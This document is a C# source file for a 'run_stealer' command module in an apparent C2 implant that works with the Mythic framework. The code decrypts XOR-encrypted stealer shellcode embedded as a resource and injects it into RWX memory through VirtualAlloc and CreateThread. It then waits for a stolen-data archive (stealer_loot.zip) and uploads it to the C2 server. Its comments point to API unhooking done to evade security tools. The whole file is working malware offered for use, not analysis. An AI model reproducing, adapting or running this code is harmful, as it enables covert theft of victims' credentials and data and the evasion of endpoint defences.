using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace Chimera.Commands
{
    /// <summary>
    /// run_stealer – injectes encrypted stealer shellcode (resource "stealer_enc")
    /// and automatically uploads the resulting loot.zip to Mythic.
    /// </summary>
    public static class InjectAssembly
    {
        private const string ResourceName = "stealer_enc";
        private static readonly byte XorKey = 0x41;
        private static readonly string LootPath = @"C:\Users\Public\stealer_loot.zip";

        // Entry point called from Tasking.Dispatch with task context
        public static string Execute(string parameters, string taskID, string callbackUUID)
        {
            try
            {
                // 1. Inject stealer shellcode
                string injectionResult = InjectShellcode();
                if (injectionResult.StartsWith("[error]"))
                    return injectionResult;

                // 2. Wait for loot.zip and upload it
                string uploadResult = WaitAndUpload(taskID, callbackUUID);
                return $"{injectionResult}\n{uploadResult}";
            }
            catch (Exception ex)
            {
                return $"[error] {ex.Message}";
            }
        }

        private static string InjectShellcode()
        {
            try
            {
                Assembly asm = Assembly.GetExecutingAssembly();
                using (Stream stream = asm.GetManifestResourceStream(ResourceName))
                {
                    if (stream == null)
                        return $"[error] Resource '{ResourceName}' not found. Ensure stealer_enc is embedded.";

                    byte[] encrypted = new byte[stream.Length];
                    stream.Read(encrypted, 0, encrypted.Length);

                    byte[] shellcode = new byte[encrypted.Length];
                    for (int i = 0; i < encrypted.Length; i++)
                        shellcode[i] = (byte)(encrypted[i] ^ XorKey);

                    // Allocate RWX memory (unhooked VirtualAlloc is clean)
                    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
                        0x1000 | 0x2000, 0x40);
                    if (addr == IntPtr.Zero)
                        return "[error] VirtualAlloc failed.";

                    Marshal.Copy(shellcode, 0, addr, shellcode.Length);

                    IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                    if (thread == IntPtr.Zero)
                        return "[error] CreateThread failed.";

                    return $"[+] Stealer shellcode injected. Thread: {thread.ToInt32()}";
                }
            }
            catch (Exception ex)
            {
                return $"[error] Injection failed: {ex.Message}";
            }
        }

        private static string WaitAndUpload(string taskID, string callbackUUID)
        {
            int timeoutSeconds = 120;
            int elapsed = 0;
            while (elapsed < timeoutSeconds)
            {
                if (File.Exists(LootPath) && new FileInfo(LootPath).Length > 0)
                {
                    // Give stealer a moment to finish writing
                    Thread.Sleep(2000);

                    try
                    {
                        // Use the agent's own upload command
                        string uploadOutput = Commands.Upload.Execute(LootPath, taskID, callbackUUID);
                        return $"[+] Loot uploaded.\n{uploadOutput}";
                    }
                    catch (Exception ex)
                    {
                        return $"[!] Loot found but upload failed: {ex.Message}";
                    }
                }
                Thread.Sleep(2000);
                elapsed += 2;
            }
            return "[!] Timeout waiting for stealer_loot.zip. Check if stealer ran correctly.";
        }

        // P/Invoke for injection (already unhooked by Program startup)
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
            IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}
